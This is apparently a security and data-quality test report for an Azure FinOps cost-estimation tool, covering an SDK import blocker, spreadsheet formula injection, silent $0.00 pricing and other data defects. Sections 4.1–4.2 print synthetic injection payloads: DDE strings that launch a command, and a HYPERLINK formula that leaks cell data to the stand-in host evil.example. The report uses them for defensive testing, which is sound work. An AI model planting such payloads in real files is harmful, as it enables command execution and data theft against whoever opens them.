# FinOps Tool — Security & Data-Quality Test Report

**Target:** `TheFulmini/finops-tool` (`main → extractor → provider → pricer → exporter`)
**Method:** offline. Synthetic Azure tenant, no credentials, no network, no real subscription.
**Date:** 30 September 2026 · **Commit tested:** `f1ac76b` plus the fixes below
**Suite:** 103 tests in 4 files — **103 passed** (79 functions, 24 of them parametrized)

## Status of this report

Four findings are **fixed**, and the tests that used to reproduce them now assert
the fixed behaviour:

| Finding | Section | Status |
|---|---|---|
| P0 — tool cannot start: `azure-mgmt-resource` import incompatible | §3 | **fixed** — import path corrected on `main` (PR #1), now guarded by this suite |
| HIGH — CSV formula injection unmitigated | §4.1 | **fixed** — neutralised in `core/spreadsheet_safety.py` |
| HIGH — the same strings become live Excel formulas in the dashboard | §4.2 | **fixed** — cells forced to a string type |
| HIGH — nested SQL resources duplicated and mis-attributed | §5.1 | **fixed** — children attributed by ARM id prefix |

Everything else in this report is **still open** and described as observed.

---

## 1. How the testing was done

The tool was exercised against synthetic Azure data. To keep the results honest, the
harness fakes **only the Azure boundary** and nothing else:

| Boundary | Replaced with | Everything else |
|---|---|---|
| `azure.mgmt.resource` clients | `offline_harness.FakeResourceManagementClient` | real `providers/azure/resources.py` |
| `azure.mgmt.subscription` | `FakeSubscriptionClient` | real `core/extractor.py` |
| `https://prices.azure.com` (via `requests.get`) | filter-keyed mock table | real `providers/azure/pricing.py` incl. its cache, pagination and error handling |
| `DefaultAzureCredential` | no-op stand-in | real `core/pricer.py`, `core/exporter.py`, `core/dashboard.py`, `main.py` |

The price endpoint is answered on the **exact OData filter string** the real
`pricing.py` builds (607 distinct filters), so `get_price()` and `_pick_best_price()`
run unmodified.

**Test convention.** `test_confirmed_*` reproduces a defect — a green run means the
defect is present and reproducible. `test_guard_*` (17 cases) asserts behaviour that
is *correct* and must not regress. `test_environment.py` runs without the shim, in
clean subprocesses, so it reflects what a real user gets.

### The mock tenant

392 normalised rows · 8 subscriptions (7 enabled, 1 disabled) · 2 management groups ·
15 resource types · 16 regions · 607 price filters · 21 adversarial payloads.
Deterministic: seed `20260930`, byte-identical on regeneration (verified by SHA-256).

Resources per subscription: Production 93, Staging 63, Data Platform 59, Development 54,
Shared Services 51, Sandbox 39, Identity 36.

---

## 2. Headline results

| Measure | As found | Now |
|---|---|---|
| Tests | 100 passed / 0 failed | **103 passed / 0 failed** |
| Blocker | the tool could not start at all on a current install | **fixed** |
| Rows reporting **$0.00** | 175 of 395 (44.3 %) | **175 of 392 (44.6 %)** — open |
| `$0.00` rows actually flagged by the tool | 1 | 1 — **open** |
| Est. monthly total produced | $151,696.04 | **$151,349.29** |
| Share of that total from VMs alone | 95.9 % | **96.1 %** (`$145,518.49`) |
| Fabricated rows (nested SQL duplication) | 3 of 6, adding $346.75/mo that does not exist | **0 of 3** |
| Injection payloads surviving to the on-disk CSV | 21 of 21 | **0** |
| Live Excel formulas written into the .xlsx | 3 (`data_type='f'`) | **0** |

As found, three findings accounted for most of the risk: the tool did not run on a
fresh install; roughly half the estate was silently priced at zero; and untrusted
strings reached Excel as executable content. The first and third are fixed — the
priced-at-zero problem remains the largest open issue.

---

## 3. P0 — BLOCKER: the tool cannot start

`providers/azure/resources.py:21`

```python
from azure.mgmt.resource import ResourceManagementClient   # ImportError on 26.0.0
```

With `azure-mgmt-resource 26.0.0` (the current version) the class is no longer
re-exported at the package root; it lives at `azure.mgmt.resource.resources`. The
import raises `ImportError`, `main.py`'s registry catches it, sets
`registry["azure"] = None`, and the run dies immediately:

```
[MAIN] Provider 'azure' is not available.
[MAIN] Make sure the required SDK is installed.
[MAIN] Run: pip install -r requirements.txt      ← this is what caused the problem
```

`requirements.txt` pins **no version** for `azure-mgmt-resource`, so every fresh
install today gets 26.0.0 and the tool is dead on arrival. The advice printed to the
operator is precisely the action that produces the broken state.

**Evidence:** `test_environment.py::test_guard_sdk_import_works_on_a_fresh_install`
(clean subprocess, no shim) and `::test_guard_cli_starts_and_completes_a_run`.

**Fix — one line, verified sufficient:**

```python
from azure.mgmt.resource.resources import ResourceManagementClient
```

With only that change applied, `main.py` completes a full run and writes every row of
the fixture (verified against the real CLI, not a patched registry). `main` now pins
the SDK exactly (`azure-mgmt-resource==26.0.0` in `requirements.txt`, frozen in
`requirements.lock`), so the layout cannot drift under the import unnoticed.

**Resolved on `main` in PR #1**, independently of this audit; the suite here guards it
against regression.

*Every finding below this point was unreachable for a real user until that landed.*

---

## 4. Security findings

### 4.1 HIGH — CSV formula injection, unmitigated

Resource names from the tenant reach the CSV **verbatim**. Seven payloads in the mock
begin with a formula character; the file is written `utf-8-sig` **with a BOM**, i.e.
deliberately targeted at Excel, which evaluates them on open.

Confirmed on disk, `mock-azure/azure_resources_normalized.csv`:

```
=HYPERLINK("http://evil.example/x?d="&A1,"click me")
=cmd|'/c calc'!A1
=1+1+cmd|' /C calc'!A0
+HYPERLINK("http://evil.example/","x")
-2+3+cmd|' /C calc'!A0
@SUM(1+1)*cmd|'/c calc'!A0
=<RTL override + Cyrillic homoglyph spoof>
```

`=cmd|' /c calc'!A1` is the classic legacy **DDE** vector: on older Excel it executes
a command without a macro prompt. The `utf-8-sig` BOM makes the file open directly in
Excel rather than through the import wizard, which is what turns this from theoretical
to live.

Also surviving: 2 names containing CR/LF, 1 name containing a NUL byte, and a
**10,003-character** name (no length validation anywhere).

**Fix:** prefix any cell starting with `= + - @ TAB CR` with `'` on export, or write
`.xlsx` with `cell.data_type = 's'` forced. Do it in one place — `exporter.export_csv`.

### 4.2 HIGH — the same untrusted strings become live Excel formulas in the dashboard

`core/dashboard.py` writes strings straight into openpyxl cells, and openpyxl treats
a leading `=` as a formula. Confirmed on the generated workbook:

```
sheet=Raw Data  cell=D143  data_type='f'  =HYPERLINK("http://evil.example/x?d="&A1,"click me")
sheet=Raw Data  cell=D144  data_type='f'  =cmd|'/c calc'!A1
sheet=Raw Data  cell=D145  data_type='f'  =1+1+cmd|' /C calc'!A0
```

`data_type='f'` is a real formula — this is a second, independent sink that fixing the
CSV exporter would not close. Three further cells (`+`, `-`, `@`) are stored as text
but convert to formulas if a user re-enters or edits them.

**Evidence:** `test_security.py::test_guard_xlsx_never_stores_a_formula_from_an_input_csv`.

**Fix:** in `dashboard.py`, set the cell value with `cell.data_type = "s"` (or
`openpyxl.cell.cell.Cell` with an explicit string), and apply the same prefix rule.

### 4.3 MEDIUM — a transient price-endpoint failure is cached as "no data", permanently

`_fetch_prices()` breaks out of its loop on `requests.RequestException` and then
caches the partial (empty) list under the filter key. Every later lookup for that SKU
returns `[]` **from cache, with no retry**. A single network blip therefore zeroes an
entire SKU/region for the whole run and the process still exits 0.

Confirmed: the second lookup issues **no** new request and still returns `$0.00`, while
the unit reads `1 Hour` — it looks billed and is not. No failure counter, no warning
in the summary, no non-zero exit status.

**Evidence:** `test_data_quality.py::test_confirmed_price_endpoint_failure_is_cached_as_no_data`.

**Fix:** don't cache on the error path; record the failure and surface a per-run count.

### 4.4 MEDIUM — tenant identifiers are emitted everywhere

Subscription IDs and display names are printed to console and written to the CSV with
no redaction. Shared logs, CI artifacts and screenshots all carry them.
*Evidence:* `test_security.py::test_confirmed_subscription_ids_written_to_all_console_output`.

### 4.5 MEDIUM — terminal-escape injection through `--input`

`--input` accepts any CSV. A `resource_name` containing ANSI escapes is echoed raw to
the terminal by the pricer's progress output, so a hostile file can rewrite the
operator's terminal. *Evidence:* `::test_confirmed_terminal_escape_injection_via_input_csv`.

### 4.6 LOW — raw exception text is echoed on auth failure

`auth.py` prints `{e}` from the credential exception, which can carry tenant and
application GUIDs into logs. *Evidence:* `::test_confirmed_auth_failure_echoes_raw_exception`.

### 4.7 LOW — no validation of input provenance

An arbitrary CSV that merely has the right column names is accepted as Azure data —
no signature, no tenant check, no schema version. Fabricated cost data flows straight
into a report. *Evidence:* `::test_confirmed_no_provenance_validation_on_input_csv`,
`::test_confirmed_unknown_columns_pass_through_to_output`.

### 4.8 LOW — unconstrained paths and symlink-following output

The CLI reads and writes wherever it is told, and `export_csv` follows a symlinked
output path (an existing target is overwritten). Expected for a CLI, but relevant if
the path is ever attacker-influenced. *Evidence:* `::test_confirmed_output_path_not_confined`,
`::test_confirmed_symlink_output_followed`.

### 4.9 What is fine

No hardcoded credentials, tokens or connection strings anywhere in the source
(`::test_guard_no_hardcoded_credentials_in_source`). `DefaultAzureCredential` is used correctly,
so there is no credential-handling bug — only the SDK import (3.1) breaks auth in
practice. The `connectionString` in the mock's tags never reaches the output.

---

## 5. Data-quality findings

### 5.1 HIGH — nested SQL resources were duplicated *and* mis-attributed — **FIXED**

`_list_nested_resources()` enumerated children with a **resource-group-scoped** query
filtered by **type only**, then prefixed each result with the **current parent's** name.
Two SQL servers sharing a resource group therefore each claimed the other's databases.

Ground truth vs. the old extraction for `rg-prod-sql`:

| Actually exists (3) | Was extracted (6) |
|---|---|
| `sql-prod-ecom/maindb` | ✔ correct |
| `sql-prod-ecom/auditdb` | ✔ correct |
| `sql-prod-report/dwdb` | ✔ correct |
| — | ✘ `sql-prod-ecom/dwdb` — does not exist |
| — | ✘ `sql-prod-report/maindb` — does not exist |
| — | ✘ `sql-prod-report/auditdb` — does not exist |

Cost impact: SQL reported **$693.50/mo** against a real **$346.75** — a 100 %
overstatement, because each database was billed twice and attributed to the wrong
server. Estate total: **$151,696.04 → $151,349.29**, the difference being exactly the
double-count.

**Fixed by** attributing each child to the parent whose ARM id prefixes the child's id
(longest prefix, whole-segment boundary, case-insensitive). A child that matches no
parent is warned about and dropped rather than hung off an arbitrary parent.

**Correction to the original suggestion here:** the first version of this report
suggested querying "with the parent in the filter". That is not possible — the generic
list API cannot be scoped to a single parent, and an RG-scoped query filtered by type
returns every resource of that type in the group. The child's own id is the only
reliable statement of its parentage, so the id prefix is the fix.

*Evidence:* `test_data_quality.py::test_guard_nested_sql_no_duplication`,
`::test_guard_nested_cost_is_not_double_counted`,
`::test_guard_owning_parent_requires_a_segment_boundary`,
`::test_guard_one_child_query_per_resource_group`,
`test_end_to_end.py::test_guard_end_to_end_sql_rows_are_not_fabricated`.

### 5.2 HIGH — 44.6 % of the estate is priced at $0.00, and the warning says "1"

175 of 392 rows report `$0.00`: **135** because their type has no `PRICE_HANDLERS`
entry (`unit="Unsupported type"`), **28** VNets (`unit="N/A (costs from peering/data
transfer)"`), **1** genuine pricing failure. The summary's own note reads:

```
Note: 1 resource(s) have no price data (NDF).
```

The counter only tests `unit == "NDF"`, so the other 174 uncosted rows are invisible.
AKS, ACR, Cognitive Services, ML Workspaces, Application Gateways, public IPs, NICs,
VMSS and KeyVault — 135 rows — all report `$0.00`. In the extended config, 10 of 15
types are unpriced.

*Evidence:* `::test_confirmed_unpriced_rows_under_reported_in_summary`,
`::test_confirmed_unsupported_types_price_at_zero`, `test_end_to_end.py::test_confirmed_end_to_end_unpriced_estate_share`.

**Fix:** count every row with `estimated_cost_usd == 0` regardless of `unit`, and
separate "genuinely free" from "unknown" in the output.

### 5.3 MEDIUM — Windows VMs are priced at the Linux rate

The price API returns a Linux and a Windows metre for the same `armSkuName`.
`_pick_best_price()` takes the **lowest** `retailPrice`, i.e. always Linux. For
`Standard_B2s`, $0.0416 vs $0.0582 — a **28.5 % understatement** on any Windows fleet.
The OS is never part of the filter, and the `kind`/`os` the extractor sees is not
consulted. *Evidence:* `::test_confirmed_windows_vm_priced_as_linux`,
`::test_confirmed_os_ambiguity_ignores_os_field`.

### 5.4 MEDIUM — price values are not validated

| Case | Behaviour | Evidence |
|---|---|---|
| Negative price (`-1.25`) | accepted → **negative cost** silently reduces the total | `::test_confirmed_negative_price_accepted` |
| `$0.00` for a paid SKU | accepted, `quantity=730` — "free" and "unknown" are identical | `::test_confirmed_zero_price_for_paid_sku_accepted` |
| `retailPrice` key absent | `.get(..., 0.0)` → a $30/h SKU becomes $0 | `::test_confirmed_missing_retail_price_becomes_zero` |
| Price is a string `"0.0846"` | `TypeError` in `round()`; `pricer` swallows it → row becomes NDF | `::test_confirmed_string_price_breaks_pricing` |
| 3 conflicting rows, same SKU+region | lowest wins, silently, no tie-break or warning | `::test_confirmed_conflicting_duplicate_prices_resolved_silently` |

The string-price case is reproduced end to end by a deterministic fixture
(`vm-stage-priceglitch`), producing:
`[WARN] Pricing failed for vm-stage-priceglitch: type str doesn't define __round__ method` —
and the run still reports success. A pricing API change would degrade quietly into
`$0.00` rather than failing.

### 5.5 MEDIUM — every quantity is an assumption, presented as an estimate

- **VMs / App Service / SQL:** hardcoded **730 h/month**. 167 rows. ARM carries no power
  state, so the mock's deallocated `vm-prod-bastion` is billed in full.
- **Storage:** hardcoded **100 GB** regardless of real usage. 53 rows. Every storage
  figure is an arbitrary constant × a per-GB rate.

No row carries a measured usage figure: **100 % of the $151,349.29 is modelled, not
observed**, and nothing in the output says so.
*Evidence:* `::test_confirmed_storage_quantity_is_hardcoded_placeholder`,
`::test_confirmed_vm_hours_assumed_regardless_of_power_state`,
`test_end_to_end.py::test_confirmed_assumption_vs_measured_ratio`.

### 5.6 MEDIUM — the resource ID is discarded, so there is no primary key

The extractor drops the Azure resource `id`. The output has no way back to a specific
resource — no portal lookup, no per-resource remediation, and no authoritative key for
deduplication. *Evidence:* `::test_confirmed_no_resource_id_in_output`.

### 5.7 MEDIUM — 384 tagged resources, and not one tag survives

`costCenter`, `owner` and `environment` are present on 384 resources in the ARM payload.
The normalised row has 8 keys and the CSV has 12 columns; none is a tag. Showback and
chargeback are impossible from this output, and the data is thrown away before it can
be used. *Evidence:* `test_end_to_end.py::test_confirmed_tags_collected_but_never_exported`.

### 5.8 MEDIUM — nothing is deduplicated

Two exact duplicate keys exist in the mock and both are exported; duplicates inflate
both the row count and the total. *Evidence:* `::test_confirmed_duplicate_rows_not_deduplicated`.

### 5.9 MEDIUM — one service appears twice in the cost summary

Pricing lowercases the type for dispatch; the exporter groups by the **raw** string.
`Microsoft.Compute/virtualMachines` and `MICROSOFT.COMPUTE/VIRTUALMACHINES` are reported
as two separate lines. *Evidence:* `::test_confirmed_mixed_case_type_splits_the_cost_summary`.

### 5.10 MEDIUM — the dashboard crashes on the extractor's own output

`--dashboard` needs the price columns, but the extractor writes its CSV **before**
pricing (8 columns). Pointed at that file — the output of `--no-pricing`, or of
extraction alone — it dies with a bare traceback:

```
KeyError: 'estimated_cost_usd'
  at dashboard.py:188 in _build_summary_sheet
```

*Evidence:* `test_end_to_end.py::test_confirmed_dashboard_crashes_on_the_extractors_own_output`.

### 5.11 LOW — reporting metadata is absent

No timestamp, no currency, no price date, no pricing region and no schema version. A
CSV found months later cannot be aged, and a `$` total cannot be converted or
reconciled against an invoice. *Evidence:* `::test_confirmed_output_has_no_metadata_columns`.

### 5.12 LOW — the `NDF` sentinel collides with real data

`NDF` means "not defined" and is also a legal resource name — the mock contains a
storage account literally named `NDF`. 218 rows have `sku=NDF`, 87 `size=NDF`, 1
`location`, 1 `resource_group`. A real resource and a missing value are indistinguishable.
*Evidence:* `::test_confirmed_sentinel_collision_with_real_name`.

### 5.13 LOW — validation is too weak to catch malformed input

Only `resource_name`, `resource_type` and `location` are required; `subscription_id`,
`resource_group`, `sku` and `size` are silently defaulted, so a malformed file still
produces a plausible-looking report. Unknown columns are passed straight through.
*Evidence:* `::test_confirmed_weak_schema_validation`.

### 5.14 LOW — `--no-pricing` makes unknown look free

Every numeric field is set to `0`, so "not measured" and "costs nothing" render
identically, in the spreadsheet and in any `SUM()` a user writes.
*Evidence:* `::test_confirmed_no_pricing_mode_looks_free`.

### 5.15 LOW — the headline total is a naive sum

No confidence weighting, no flag for assumed quantities, no exclusion of negative or
zero-priced rows. The figure presented as the estate cost mixes measured, assumed and
fabricated values. *Evidence:* `::test_confirmed_aggregate_total_is_naive_sum`.

### 5.16 LOW — packaging

No `pyproject.toml`, no console entry point, no `__version__` anywhere — the tool is
`python main.py` only and cannot be installed, versioned or distributed. `pytest` sits
in the runtime `requirements.txt` under a comment heading, with no dev/optional split,
so every end user installs a test framework. *Evidence:* `test_environment.py`.

*Resolved since this was observed:* the tracked `.venv` trees were removed from the
repository in `f1ac76b`; a developer's working copy still holds them, but they are
ignored, so this is no longer a repository-level finding.

---

## 6. What works (17 guard tests, all passing)

- Disabled subscriptions are correctly skipped.
- Top-level extraction is 1:1 with the source for every top-level type tested.
- A single parent in a resource group extracts nested children correctly.
- Spot prices are filtered out; `priceType != Consumption` reservations are filtered out.
- The "Data Stored" metre wins over write-operation metres for storage.
- An empty price response and an unpriced region degrade to `$0.00` without crashing.
- Identical filters hit the price endpoint exactly once (cache works — when nothing fails).
- The full pipeline completes, writes a valid CSV, and is **byte-for-byte deterministic**
  across two runs.
- `--no-pricing` runs without touching the price endpoint.
- No hardcoded credentials anywhere in the source.

---

## 7. Recommended order of work

1. **Fix the SDK import** and pin `azure-mgmt-resource>=26`. Nothing else matters until
   the tool starts. *(one line)*
2. **Neutralise formula injection at both sinks** — `exporter.export_csv` and
   `dashboard.py`. Decide whether `utf-8-sig` is still wanted once that is done.
3. **Fix nested resource enumeration** — it is producing wrong data and double cost today.
4. **Make unpriced visible** — count all `$0.00` rows, and distinguish "free" from
   "unknown" in the CSV.
5. **Validate prices** — reject negative, non-numeric and missing values; stop caching
   failures; log a per-run failure count.
6. **Carry the resource ID and the tags** — without them the output cannot be reconciled
   or allocated.
7. Then the reporting layer: metadata columns, dedupe, case-normalised grouping, and a
   clear "assumed vs measured" flag on every row.

---

## 8. Reproducing this

```bash
cd /opt/data/repos/finops-tool

# regenerate the dataset (deterministic, seed 20260930)
.venv-312/bin/python mock-azure/generate_mock_azure.py

# run the suite
.venv-312/bin/python -m pytest mock-azure/ -q
```

Files added (all untracked, safe to delete): `mock-azure/generate_mock_azure.py`,
`offline_harness.py`, `conftest.py`, `test_security.py`, `test_data_quality.py`,
`test_end_to_end.py`, `test_environment.py`, `README.md`, `REPORT.md` plus the three
JSON fixtures and one CSV.

**Caveat on the fixture:** mock retail prices are region-flat and there is no EA,
reservation or Spot modelling beyond what the traps exercise. The 21 injection payloads
are synthetic strings, not observed tenant data.
